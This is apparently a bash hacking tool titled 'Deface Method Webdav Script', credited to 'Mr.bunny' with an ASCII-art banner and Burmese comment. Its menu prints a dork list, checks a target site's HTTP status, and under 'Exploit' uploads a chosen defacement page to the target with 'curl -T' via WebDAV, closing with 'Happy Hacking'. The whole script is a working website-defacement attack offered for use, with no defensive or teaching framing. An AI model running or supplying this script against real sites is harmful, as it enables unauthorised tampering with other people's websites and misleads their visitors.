#!/bin/bash

# nano နဲ့ nameမချိန်းနဲ့ငါကောင်😏
#
clear
echo ""

echo -e "\e[1;31m 
          ⣿⡇⣿⣿⣿⠛⠁⣴⣿⡿⠿⠧⠹⠿⠘⣿⣿⣿⡇⢸⡻⣿⣿⣿⣿⣿⣿⣿
          ⢹⡇⣿⣿⣿⠄⣞⣯⣷⣾⣿⣿⣧⡹⡆⡀⠉⢹⡌⠐⢿⣿⣿⣿⡞⣿⣿⣿
          ⣾⡇⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⢻⣦⡀⠁⢸⡌⠻⣿⣿⣿⡽⣿⣿
          ⡇⣿⠹⣿⡇⡟⠛⣉⠁⠉⠉⠻⡿⣿⣿⣿⣿⣿⣦⣄⡉⠂⠈⠙⢿⣿⣝⣿
          ⠤⢿⡄⠹⣧⣷⣸⡇⠄⠄⠲⢰⣌⣾⣿⣿⣿⣿⣿⣿⣶⣤⣤⡀⠄⠈⠻⢮
          ⠄⢸⣧⠄⢘⢻⣿⡇⢀⣀⠄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠄⢀
         ⠄⠈⣿⡆⢸⣿⣿⣿⣬⣭⣴⣿⣿⣿⣿⣿⣿⣿⣯⠝⠛⠛⠙⢿⡿⠃⠄⢸
         ⠄⠄⢿⣿⡀⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡾⠁⢠⡇⢀
         ⠄⠄⢸⣿⡇⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣫⣻⡟⢀⠄⣿⣷⣾
         ⠄⠄⢸⣿⡇⠄⠈⠙⠿⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⠊⢀⡇⣿⣿
         ⠒⠤⠄⣿⡇⢀⡲⠄⠄⠈⠙⠻⢿⣿⣿⠿⠿⠟⠛⠋⠁⣰⠇⠄⢸⣿⣿⣿
         ⠄⠄⠄⣿⡇⢬⡻⡇⡄⠄⠄⠄⡰⢖⠔⠉⠄⠄⠄⠄⣼⠏⠄⠄⢸⣿⣿⣿
         ⠄⠄⠄⣿⡇⠄⠙⢌⢷⣆⡀⡾⡣⠃⠄⠄⠄⠄⠄⣼⡟⠄⠄⠄⠄⢿⣿⣿
\e[0m" 

echo ""

echo -e "\e[1;95m      || =====> Deface Method Webdav Script <===== || "
echo ""
echo -e "\e[1;32m _______________ code  By Ad A M (Mr.bunny🐰)_______________\e[1;32m"
echo ""
echo -e "\e[1;91m                We are Myanmar \e[0m"
echo ""
op=("Dork" "Exploit" "Website inspection"  "exit")
select opt in "${op[@]}"
do 
echo ""
case $opt in
"Dork")
echo ""
cat dork.txt
;;
"Website inspection")
read -p "Enter Trage site :: " T 
url=$(curl -Iks $T | grep -I "HTTP/")
echo -e "\e[1;33m target situation :: $url \e[0m"

;;

"Exploit")
read -p "Enter  Trage site :: " t
echo ""
read -p "Enter Deface  Script  :: " p
echo ""
echo -e "\e[1;32m   Checking Your Deface Script \e[0m"

if [[ -e "$p" ]];then
echo ""
echo -e "\e[1;32m   OK,Found \e[0m"
curl -T $p $t

sleep 2
echo -e "\e[1;32m#====> :: $t/$p  \e[0m"
else
echo ""
echo -e "\e[1;31m    Deface Script Not Found\e[0m"
exit
fi
;;
"exit")
echo -e "\e[1;32m ××× Dont have a good day have a great day ✓✓✓\e[0m"
echo ""
echo -e "\e[1;32m        <==== Happy Hacking ====>"
echo ""
exit
;;
*) echo "invalid option"
;;
    esac
done
